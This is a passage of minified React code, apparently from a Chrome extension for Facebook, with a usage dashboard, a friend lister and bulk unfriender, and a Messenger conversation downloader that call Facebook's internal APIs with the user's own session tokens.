card-plain",children:Object(f.jsx)(M.a,{children:Object(f.jsx)("ul",{className:"timeline",children:e.map((({node:e},t)=>Object(f.jsxs)("li",{className:t%2===1?"timeline-inverted":"",onClick:()=>xe("https://www.facebook.com/lnmaiPage/posts/".concat(atob(e.id).split(":")[2])),children:[Object(f.jsx)("div",{className:"timeline-badge info",children:Object(f.jsx)("i",{className:"tim-icons icon-notes"})}),Object(f.jsxs)("div",{className:"timeline-panel",children:[Object(f.jsx)("div",{className:"timeline-heading",children:Object(f.jsx)(B.a,{color:"info",pill:!0,children:q()(1e3*e.creation_time).fromNow()})}),Object(f.jsx)("div",{className:"timeline-body",children:Object(f.jsx)("pre",{className:"card-text",style:{whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif",cursor:"pointer"},children:e.message.text})}),Object(f.jsxs)("h6",{children:[Object(f.jsx)("i",{className:"ti-time"}),"by Loc"]})]})]},t)))})})})}):null;class ye extends n.a.Component{constructor(e){super(e),this.getAnalytic=()=>{L.a.get("https://mtfb.lnmai.com/analytic",{cancelToken:this.axiosSource.token}).then((e=>{if((e=e.data).error)return console.log(e.error);e.countries&&(e.countries.forEach((([e,t,s])=>{this.mapData=Object(a.a)(Object(a.a)({},this.mapData),{},{[t]:s}),this.mapChart=[...this.mapChart,[e,s]]})),this.setState({gotMap:!0}),localStorage.gotMap=this.today,localStorage.mapData=JSON.stringify(this.mapData),localStorage.mapChart=JSON.stringify(this.mapChart)),e.users&&(e.users.forEach((([e,t])=>{this.dailyUser=[...this.dailyUser,[e,t]]})),this.setState({gotUsers:!0}),localStorage.gotUsers=this.today,localStorage.dailyUser=JSON.stringify(this.dailyUser))}))},this.postCharts=()=>{const e=localStorage.dailyUser;e&&(this.dailyUser=JSON.parse(e),this.setState({gotUsers:!0}));const t=localStorage.mapChart,s=localStorage.mapData;t&&s&&(this.mapData=JSON.parse(s),this.mapChart=JSON.parse(t),this.setState({gotMap:!0}))},this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.mapData={},this.mapChart=[],this.dailyUser=[],this.today=(new Date).getDay(),this.state={gotMap:!1,gotUsers:!1,news:null};const t=L.a.CancelToken;this.axiosSource=t.source()}componentDidMount(){ga_trackButtonClick("dashboard"),this.today!==parseInt(localStorage.gotMap)||this.today!==parseInt(localStorage.gotUsers)?this.getAnalytic():this.postCharts();const e=new FormData;e.append("fb_dtsg",localStorage.dt),e.append("q","node(906140862921618){timeline_feed_units.first(10).after(){page_info,edges{node{id,creation_time,can_viewer_edit_post_privacy,message{text},privacy_scope{type},feedback{reactors{count},comments{count},reshares{count}}}}}}"),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:e,cancelToken:this.axiosSource.token}).then((e=>{!(e=e.data).error&&e[906140862921618]&&e[906140862921618].timeline_feed_units&&e[906140862921618].timeline_feed_units.edges&&this.setState({news:e[906140862921618].timeline_feed_units.edges})})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best")}))}render(){let e=null;this.state.gotMap&&(e=Object(f.jsx)(R.a,{lg:"12",children:Object(f.jsxs)(E.a,{children:[Object(f.jsxs)(U.a,{children:[Object(f.jsx)(H.a,{tag:"h4",children:"Global Sessions by Locations"}),Object(f.jsx)("p",{className:"card-category",children:"All Sessions within 30 days"})]}),Object(f.jsx)(M.a,{children:Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{lg:"6",children:Object(f.jsx)(I.VectorMap,{map:"world_mill",backgroundColor:"transparent",zoomOnScroll:!1,containerStyle:{width:"100%",height:"300px"},regionStyle:{initial:{fill:"#e4e4e4","fill-opacity":.9,stroke:"none","stroke-width":0,"stroke-opacity":0}},series:{regions:[{values:this.mapData,scale:["#AAAAAA","#444444"],normalizeFunction:"polynomial"}]},onRegionTipShow:(e,t,s)=>{t.html("".concat(t.html()," - ").concat(this.mapData[s]," sessions"))}})}),Object(f.jsx)(R.a,{lg:"6",children:Object(f.jsx)("div",{className:"chart-area",children:Object(f.jsx)(P.Pie,{data:e=>{const t=e.getContext("2d").createLinearGradient(0,230,0,50);return t.addColorStop(1,"rgba(72,72,176,0.4)"),t.addColorStop(.8,"rgba(72,72,176,0.2)"),t.addColorStop(0,"rgba(119,52,169,0)"),{labels:this.mapChart.slice(0,5).map((([e])=>e)),datasets:[{label:"Sessions",backgroundColor:t,borderColor:"#ba54f5",borderWidth:2,pointRadius:0,pointHoverRadius:0,pointBackgroundColor:"#be55ed",pointBorderColor:"rgba(255,255,255,0)",pointHoverBackgroundColor:"#be55ed",data:this.mapChart.slice(0,5).map((([,e])=>e))}]}},options:_e.pie})})})]})})]})}));let t=null;return this.state.gotUsers&&(t=Object(f.jsx)(R.a,{lg:"12",children:Object(f.jsxs)(E.a,{className:"card-chart",children:[Object(f.jsxs)(U.a,{children:[Object(f.jsx)("h5",{className:"card-category",children:"Active Users"}),Object(f.jsxs)(H.a,{tag:"h3",children:[Object(f.jsx)("i",{className:"tim-icons icon-single-02 text-info"})," By Date"]})]}),Object(f.jsx)(M.a,{children:Object(f.jsx)("div",{className:"chart-area",children:Object(f.jsx)(P.Line,{data:e=>{const t=e.getContext("2d").createLinearGradient(0,230,0,50);return t.addColorStop(1,"rgba(72,72,176,0.4)"),t.addColorStop(.8,"rgba(72,72,176,0.2)"),t.addColorStop(0,"rgba(119,52,169,0)"),{labels:this.dailyUser.map((([e])=>q()(e,"YYYYMMDD").format("MMM Do YY"))),datasets:[{label:"Users",fill:!0,backgroundColor:t,borderColor:"#ba54f5",borderWidth:2,borderDash:[],borderDashOffset:0,pointBackgroundColor:"#be55ed",pointBorderColor:"rgba(255,255,255,0)",pointHoverBackgroundColor:"#be55ed",pointBorderWidth:20,pointHoverRadius:4,pointHoverBorderWidth:15,pointRadius:4,data:this.dailyUser.map((([,e])=>e))}]}},options:_e.line})})})]})})),Object(f.jsxs)("div",{className:"content",children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{lg:"12",children:Object(f.jsx)(je,{stats:!0})}),Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsx)(M.a,{children:Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{xs:"5",children:Object(f.jsx)("div",{className:"info-icon text-center icon-warning",children:Object(f.jsx)("i",{className:"tim-icons icon-app"})})}),Object(f.jsx)(R.a,{xs:"7",children:Object(f.jsx)("div",{className:"numbers",children:Object(f.jsx)(H.a,{tag:"h3",children:Object(f.jsx)("a",{href:"https://chrome.google.com/webstore/detail/eojdckfcadamkapabechhbnkleligand",target:"_blank",rel:"noopener noreferrer",children:Object(f.jsx)("img",{src:"https://img.shields.io/chrome-web-store/v/eojdckfcadamkapabechhbnkleligand.svg?label=Version&colorB=ff8d72&style=for-the-badge",alt:"L.O.C"})})})})})]})})})}),Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsx)(M.a,{children:Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{xs:"5",children:Object(f.jsx)("div",{className:"info-icon text-center icon-primary",children:Object(f.jsx)("i",{className:"tim-icons icon-shape-star"})})}),Object(f.jsx)(R.a,{xs:"7",children:Object(f.jsx)("div",{className:"numbers",children:Object(f.jsx)(H.a,{tag:"h3",children:Object(f.jsx)("a",{href:"https://chrome.google.com/webstore/detail/eojdckfcadamkapabechhbnkleligand/reviews",target:"_blank",rel:"noopener noreferrer",children:Object(f.jsx)("img",{src:"https://img.shields.io/chrome-web-store/rating/eojdckfcadamkapabechhbnkleligand.svg?label=Rating&colorB=e14eca&style=for-the-badge",alt:"L.O.C"})})})})})]})})})}),Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsx)(M.a,{children:Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{xs:"5",children:Object(f.jsx)("div",{className:"info-icon text-center icon-info",children:Object(f.jsx)("i",{className:"tim-icons icon-single-02"})})}),Object(f.jsx)(R.a,{xs:"7",children:Object(f.jsx)("div",{className:"numbers",children:Object(f.jsx)(H.a,{tag:"h3",children:Object(f.jsx)("a",{href:"https://chrome.google.com/webstore/detail/eojdckfcadamkapabechhbnkleligand",target:"_blank",rel:"noopener noreferrer",children:Object(f.jsx)("img",{src:"https://img.shields.io/chrome-web-store/users/eojdckfcadamkapabechhbnkleligand.svg?label=Users&colorB=1d8cf8&style=for-the-badge",alt:"L.O.C"})})})})})]})})})})]}),Object(f.jsxs)(z.a,{children:[Object(f.jsx)(Oe,{}),t,e,Object(f.jsx)(ve,{news:this.state.news})]})]})}}var ke=ye,Se=s(24),we=s(33),Ae=s(26),De=s.n(Ae),Ce=s(234),Ne=s(235),Ie=s(236),Pe=s(237);const Te=[{label:"UID",key:"uid"},{label:"Name",key:"name"},{label:"Link",key:"url"}];class Le extends n.a.Component{constructor(){super(),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.finalizeFriendsList=()=>{if(!1===this.state.gotActiveFriendData||!1===this.state.gotFriendData)return;const e=[];let t=0;Object.keys(this.friendData).forEach((s=>this.activeFriendData[s]?(this.friendData[s].status="Active",e.push(this.friendData[s])):(t++,!0===this.state.aw2721d?(this.friendData[s].url&&!this.activeFriendData[s]?this.friendData[s].status="Locked By Facebook":this.friendData[s].status="Deactivated",e.push(this.friendData[s])):void 0))),!1===this.state.aw2721d&&t>0&&this.setAlert("Warning","Found ".concat(t," locked and deactivated friend").concat(t>1?"s":"",". Get Premium to remove them!"),"info"),this.setState({selection:this.friendData,data:e,gotData:!0})},this.buildActiveFriend=(e="")=>{L()({method:"GET",url:"https://graph.facebook.com/me/friends",params:{fields:"id",limit:500,access_token:localStorage.touch,after:e}}).then((e=>{if((e=e.data).data.forEach((e=>{this.activeFriendData[e.id]=!0})),e.paging.next)return this.buildActiveFriend(e.paging.cursors.after);this.setState({gotActiveFriendData:!0},(()=>{this.finalizeFriendsList()}))})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");this.setAlert("Error","Something went south, contact Loc for help","error"),this.setState({error:!0,gotActiveFriendData:null},(()=>{this.finalizeFriendsList()}))}))},this.fetchFriend=e=>{if(e.edges.forEach((({node:e})=>{const t=atob(e.id).split("::")[1];this.friendData[t]={uid:t,name:e.title.text,url:e.url,image:e.image.uri,selected:!1}})),e.page_info&&e.page_info.has_next_page)return this.buildFriend(e.page_info.end_cursor);this.setState({gotFriendData:!0},(()=>{this.finalizeFriendsList()}))},this.buildFriend=(e=null)=>{e=e?'"'.concat(e,'"'):null;const t=new FormData;t.append("__user",localStorage.id),t.append("__a",1),t.append("dpr",1),t.append("fb_dtsg",localStorage.dt),t.append("fb_api_caller_class","RelayModern"),t.append("fb_api_req_friendly_name","ProfileCometAppCollectionListRendererPaginationQuery"),t.append("variables",'{"count":8,"cursor":'.concat(e,',"id":"').concat(ge(localStorage.id,2356318349,2),'", "privacySelectorRenderLocation":"COMET_PROFILE_COLLECTIONS"}')),t.append("doc_id",0x9e5630b1f19ea),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:t,cancelToken:this.axiosSource.token}).then((e=>{if((e=e.data).data){const t=e.data.node.items;if(0===t.count)return this.setState({gotData:!0}),this.setAlert("Error","You got no friends, LOL!","error");this.setState({progress:parseInt((Object.keys(this.friendData).length+t.edges.length)/t.count*100)}),this.fetchFriend(t)}else this.setState({error:!0}),this.setAlert("Error","Something went south, contact Loc for help","error")})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");e.response&&0===e.response.status?this.buildFriend():e.response&&e.response.data&&e.response.data.error?this.setAlert("Error",e.response.data.error.message,"error"):(this.setState({error:!0}),this.setAlert("Error","Something went south, contact Loc for help","error"))}))},this.resetCheckbox=()=>{if(!this.checkboxTable)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.friendData);for(let o=a;o<i;o++)if(!r[e.sortedData[o].uid].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.friendData);for(let o=i;o<n&&(r[t.sortedData[o].uid].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.friendData);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.updateData=()=>{this.friendData=this.state.selection},this.removeFriendsHelper=e=>{const t=e.pop();return t?this.friendData[t.uid].url&&!this.activeFriendData[t.uid]?this.removeLockedFriends(t,e):this.removeFriends(t,e):(this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success"))},this.removeLockedFriends=(e,t)=>{const s=e.uid,a=new FormData;a.append("uid",s),a.append("__a","1"),a.append("fb_dtsg",localStorage.dt),L()({method:"POST",url:"https://www.facebook.com/ajax/profile/removefriendconfirm.php?dpr=1",data:a,cancelToken:this.axiosSource.token}).then((s=>{if(s=s.data,s=ue(s.slice(9)))if(s.error){const a="\u274c ".concat(e.name,": ").concat(s.errorSummary,".\n").concat(this.state.results);this.setState({results:a}),this.removeFriendsHelper(t)}else{const s="\ud83d\udc4b ".concat(e.name,": removed.\n").concat(this.state.results),a=this.state.data.filter((t=>t.uid!==e.uid)),i=this.state.selection;i[e.uid]&&delete i[e.uid],this.setState({data:a,selection:i,results:s},(()=>{this.updateData(),this.removeFriendsHelper(t)}))}else{const s="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:s}),this.removeFriendsHelper(t)}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");const a="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:a}),this.removeFriendsHelper(t)}))},this.removeFriends=(e,t)=>{const s=e.url?e.uid:btoa("restrictedUserNode".concat(e.uid)),a=new FormData;a.append("__user",localStorage.id),a.append("__a",1),a.append("dpr",1),a.append("fb_dtsg",localStorage.dt),a.append("fb_api_caller_class","RelayModern"),a.append("fb_api_req_friendly_name","FriendingCometUnfriendMutation"),a.append("doc_id",0x83b3b0ed6a6d0),a.append("variables",'{"input":{"source":"bd_profile_button","unfriended_user_id":"'.concat(s,'","actor_id":"').concat(localStorage.id,'","client_mutation_id":"1"},"scale":1}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:a,cancelToken:this.axiosSource.token}).then((s=>{if((s=s.data).data){if(s.data.friend_remove){const s="\ud83d\udc4b ".concat(e.name,": removed.\n").concat(this.state.results),a=this.state.data.filter((t=>t.uid!==e.uid)),i=this.state.selection;i[e.uid]&&delete i[e.uid],this.setState({data:a,selection:i,results:s},(()=>{this.updateData(),this.removeFriendsHelper(t)}))}else if(s.errors){const a="\u274c ".concat(e.name,": ").concat(s.errors[0].summary,".\n").concat(this.state.results);this.setState({results:a}),this.removeFriendsHelper(t)}}else{s=ue(s.slice(9));const a="\u274c ".concat(e.name,": ").concat(s.errorSummary,".\n").concat(this.state.results);this.setState({results:a}),this.removeFriendsHelper(t)}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");const a="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:a}),this.removeFriendsHelper(t)}))},this.confirmByebye=()=>{if(0===this.state.data.length)return this.setAlert("Noiceeee","You have no friends!","success");const e=[];if(Object.keys(this.state.selection).forEach((t=>{this.state.selection[t].selected&&e.push(this.state.selection[t])})),0===e.length)return this.setAlert("Noiceeee","No one got deleted!","success");this.setState({loading:!0,alert:Object(f.jsx)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.removeFriendsHelper(e)},onCancel:()=>{this.hideAlert(),this.setState({loading:!1})},confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:"Unfriend",cancelBtnText:"Cancel",showCancel:!0,btnSize:"",children:"You are about to remove ".concat(e.length," friend").concat(e.length>1?"s":"","!")})})},this.componentDidMount=()=>{ga_trackButtonClick("friends_remover"),pe().then((e=>{this.setState({aw2721d:De.a.decrypt(this.state.locmai,e)===this.state.locmai}),this.buildFriend(),this.buildActiveFriend()})).catch((()=>{this.setState({aw2721d:null})}))},this.friendData={},this.activeFriendData={},this.state={data:[],results:"",selection:{},selectAll:!1,alert:null,error:null,loading:!1,gotData:!1,gotFriendData:!1,gotActiveFriendData:!1,aw2721d:null,progress:0,ghostFriends:0,locmai:localStorage.id};const e=L.a.CancelToken;this.axiosSource=e.source()}render(){return Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),this.state.gotData?Object(f.jsx)(R.a,{md:12,children:Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-info",children:Object(f.jsx)("i",{className:"fas fa-users"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Friends List"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})})]}),Object(f.jsx)("hr",{}),Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("blockquote",{children:Object(f.jsx)("div",{className:"blockquote blockquote-danger",children:Object(f.jsxs)("p",{className:"text-danger",children:[!this.state.aw2721d&&Object(f.jsx)("div",{className:"text-success",children:"Become a Premium user to find and remove Locked and Deactivated Friends!"}),Object(f.jsx)("i",{className:"fas fa-exclamation-triangle"}),"Think twice before removing anyone. If you are temporary blocked from this feature, it is because of Facebook's security feature. You just have to wait some time before removing more friends."]})})}),Object(f.jsx)("br",{}),Object(f.jsx)("pre",{className:"card-text",style:{maxHeight:"500px",whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif"},children:this.state.results})]}),Object(f.jsx)(R.a,{md:"12",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary",disabled:this.state.loading,children:Object(f.jsxs)(we.CSVLink,{data:this.state.data,headers:Te,filename:"mtfb-friends-list.csv",children:[Object(f.jsx)("i",{className:"fas fa-file-download"})," CSV"]})}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:this.confirmByebye,disabled:this.state.loading,children:"Bye Bye"})]})})]}),Object(f.jsx)(Se.a,{data:this.state.data,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:!0,sortable:!0,defaultSorted:[{id:"url",desc:!0}],getTrProps:(e,t)=>{if(t&&t.row){return{onClick:e=>{this.state.loading||"form-check-sign"===e.target.className||"form-check-input"===e.target.className||"span-name"===e.target.className||this.handleSingleCheckboxChange(t.original.uid)},style:this.state.selection[t.original.uid].selected?{background:"#344675"}:{}}}return{}},resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{height:34,src:e.original.image,alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:"https://www.facebook.com/".concat(e.original.uid),rel:"noopener noreferrer",className:"span-name",target:"_blank",children:Object(f.jsx)("span",{className:"span-name",children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"UID",id:"uid",accessor:e=>parseInt(e.uid),maxWidth:200},{Header:"Status",id:"url",accessor:e=>!1===this.state.aw2721d||e.url&&this.activeFriendData[e.uid]?"Active":e.url&&!this.activeFriendData[e.uid]?"Locked By Facebook":"Deactivated",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase()),maxWidth:400},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.loading}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.uid].selected,disabled:this.state.loading,onChange:()=>this.handleSingleCheckboxChange(e.original.uid)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"})]})})}):Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(E.a,{children:this.state.error?Object(f.jsxs)(M.a,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Error"}),Object(f.jsx)("h1",{className:"text-center",children:"Oops, something went wrong"})]}):Object(f.jsxs)(M.a,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Fetching data..."}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})}),Object(f.jsx)(z.a,{children:Object(f.jsx)(R.a,{md:12,children:Object(f.jsxs)("div",{className:"progress-container progress-success",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Fetching..."}),Object(f.jsx)(Pe.a,{max:"100",value:this.state.progress,children:Object(f.jsxs)("span",{className:"progress-value",children:[this.state.progress,"%"]})})]})})})]})})})]})]})}}var Fe=Le,qe=s(42),Re=s.n(qe),Ee=s(83),Me=s(44),Be=s.n(Me),Ue=s(242);class He extends n.a.Component{constructor(e){super(e),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.verifyNumber=e=>new RegExp("^[0-9]+$").test(e),this.change=e=>{this.verifyNumber(e.target.value)?this.setState({uidState:"has-success"}):this.setState({uidState:"has-danger"}),this.setState({uid:e.target.value})},this.submitDownload=()=>{if(""!==this.state.uidState&&this.verifyNumber(this.state.uid)){const e=this.state,t=e.start,s=e.end;t>s?this.setState({start:s,end:t,loading:!0},(()=>{this.getCount(this.state.uid)})):this.setState({loading:!0},(()=>{this.getCount(this.state.uid)}))}else this.setState({uidState:"has-danger"})},this.getCount=e=>{const t=this.state.end,s=new FormData;s.append("fb_dtsg",localStorage.dt),s.append("queries",'{"o0":{"doc_id":"1526314457427586","query_params":{"id":"'.concat(e,'","message_limit":1,"load_messages":true,"load_read_receipts":true,"before":').concat(t,"}}}")),L()({method:"POST",url:"https://www.facebook.com/api/graphqlbatch/",data:s,cancelToken:this.axiosSource.token}).then((s=>{s=s.data,(s=ue(s.split("\n")[0]))?s.o0.data.message_thread&&s.o0.data.message_thread.messages_count?this.fetchThread(e,s.o0.data.message_thread.messages_count,t,[]):(this.setState({loading:!1}),null==s.o0.data.message_thread?this.notify("No conversation founded!"):this.notify("Uh oh, contact Loc for help!")):this.notify("Uh oh, contact Loc for help!")})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best")}))},this.fetchThread=(e,t,s,a)=>{const i=t>=499?499:t,n=new FormData;n.append("fb_dtsg",localStorage.dt),n.append("queries",'{"o0":{"doc_id":"1526314457427586","query_params":{"id":"'.concat(e,'","message_limit":').concat(i,',"load_messages":true,"load_read_receipts":true,"before":').concat(s,"}}}")),L()({method:"POST",url:"https://m.facebook.com/api/graphqlbatch/",data:n,cancelToken:this.axiosSource.token}).then((s=>{if(s=s.data,!(s=ue(s.split("\n")[0])))return a.length?(this.setState({loading:!1,progress:0}),W(a,e,this.state.option.value,this.props.senderImgs),this.notify("Uh oh! Something went wrong! Downloaled partial of your conversation!")):this.notify("Uh oh! Something went wrong! Contact Loc for help!");{const i=s.o0.data.message_thread.messages.nodes;let n=!0;if(i.length>1){for(let e=i.length-1;e>=0;e--){if(!(i[e].timestamp_precise>=this.state.start)){n=!1;break}a.unshift(i[e])}if(a.length&&this.setState({progress:parseInt((this.state.end-a[0].timestamp_precise)/(this.state.end-this.state.start)*100)}),n)return this.fetchThread(e,t,i[0].timestamp_precise,a)}if(i.length<=1||!n||!s.o0.data.message_thread.messages.page_info.has_previous_page){if(this.setState({loading:!1,progress:0}),!a.length)return this.notify("No messages found within the range");W(a,e,this.state.option.value,this.props.senderImgs),this.notify("Downloaded conversation successfully!")}}})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best")}))},this.notify=e=>{const t={place:"tr",message:Object(f.jsx)("div",{children:e}),type:"success",icon:"tim-icons icon-bell-55",autoDismiss:5};this.refs.notificationAlert.notificationAlert(t)},this.state={loading:!1,progress:0,uid:"",uidState:"",option:{value:"1",label:"Whole Conversation"},end:Date.now(),start:Date.now()-31536e6};const t=L.a.CancelToken;this.axiosSource=t.source()}render(){let e;return this.state.loading&&(e=Object(f.jsx)(z.a,{children:Object(f.jsx)(R.a,{md:12,children:Object(f.jsxs)("div",{className:"progress-container progress-success",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Fetching..."}),Object(f.jsx)(Pe.a,{max:"100",value:this.state.progress,children:Object(f.jsxs)("span",{className:"progress-value",children:[this.state.progress,"%"]})})]})})})),Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("div",{className:"rna-container",children:Object(f.jsx)(Re.a,{ref:"notificationAlert"})}),Object(f.jsx)(R.a,{md:12,children:Object(f.jsxs)(Ue.a,{className:"form-horizontal",children:[Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:"6",children:[Object(f.jsx)(Ne.a,{children:"Thread ID"}),Object(f.jsxs)(Ce.a,{className:this.state.uidState,children:[Object(f.jsx)(Ie.a,{placeholder:"Please enter a valid Thread ID - ex 806399409",name:"uid",type:"text",onChange:this.change,disabled:this.state.loading}),"has-danger"===this.state.uidState?Object(f.jsx)("label",{className:"error",children:"Please enter a Thread ID."}):null]})]}),Object(f.jsxs)(R.a,{md:"6",children:[Object(f.jsx)(Ne.a,{children:"Download Option"}),Object(f.jsx)(Ee.a,{className:"react-select info",classNamePrefix:"react-select",name:"singleSelect",value:this.state.option,isDisabled:this.state.loading,onChange:e=>this.setState({option:e}),options:[{value:"",label:"Download Option",isDisabled:!0},{value:"1",label:"Whole Conversation"},{value:"2",label:"Audios Only"},{value:"3",label:"Photos only"},{value:"4",label:"Files only"}],placeholder:"Download Option"})]}),Object(f.jsxs)(R.a,{md:6,children:[Object(f.jsx)(Ne.a,{children:"From"}),Object(f.jsx)(Ce.a,{children:Object(f.jsx)(Be.a,{inputProps:{className:"form-control",placeholder:"From",disabled:this.state.loading},value:new Date(this.state.start),onChange:e=>{this.setState({start:new Date(e._d).valueOf()})}})})]}),Object(f.jsxs)(R.a,{md:6,children:[Object(f.jsx)(Ne.a,{children:"To"}),Object(f.jsx)(Ce.a,{children:Object(f.jsx)(Be.a,{inputProps:{className:"form-control",placeholder:"To",disabled:this.state.loading},value:new Date(this.state.end),onChange:e=>{this.setState({end:new Date(e._d).valueOf()})}})})]}),Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(u.a,{className:"btn btn-simple btn-info",onClick:this.submitDownload,disabled:this.state.loading,children:"Download"})})]}),e]})})]})}}var ze=He;class Ge extends n.a.Component{constructor(e){super(e),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.notify=e=>{const t={place:"tr",message:Object(f.jsx)("div",{children:Object(f.jsx)("div",{children:e})}),type:"success",icon:"tim-icons icon-bell-55",autoDismiss:5};this.refs.notificationAlert.notificationAlert(t)},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.spreadData=e=>{const t=e.id?atob(e.id).split(":")[1]:"ONE_TO_ONE"===e.thread_type?e.thread_key.other_user_id:e.thread_key.thread_fbid;if(!1!==this.state.aw2721d)if("ONE_TO_ONE"===e.thread_type)this.messageThreads[t]={name:e.all_participants.nodes[0].messaging_actor.name,uid:t,count:e.messages_count,type:"1:1",image:e.all_participants.nodes[0].messaging_actor.profile_picture?e.all_participants.nodes[0].messaging_actor.profile_picture.uri:e.all_participants.nodes[0].messaging_actor.big_image_src.uri,selected:!1},this.senderImgs[t]=this.messageThreads[t].image;else{const s=e.name||e.all_participants.nodes.reduce(((t,s,a)=>a===e.all_participants.nodes.length-1?"".concat(t).concat(s.messaging_actor.name,"."):"".concat(t).concat(s.messaging_actor.name,", 